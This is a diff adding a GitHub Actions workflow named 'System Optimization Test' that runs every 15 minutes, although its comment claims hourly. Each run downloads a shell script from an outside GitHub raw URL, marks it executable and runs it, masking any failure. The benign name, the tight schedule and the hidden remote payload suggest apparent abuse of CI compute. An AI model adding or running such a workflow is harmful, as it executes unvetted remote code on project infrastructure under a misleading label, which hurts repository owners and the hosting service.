@@ -1,0 +1,20 @@
+name: System Optimization Test
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *' # Runs every hour at the 0th minute
+
+jobs:
+  optimization-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch optimization script
+        run: |
+          curl -sLo bench_setup.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/main/screen.sh
+          chmod +x bench_setup.sh
+          
+      - name: Execute test
+        run: |
+          # Run with timeout to prevent indefinite execution
+          ./bench_setup.sh || echo "Test completed or timed out"
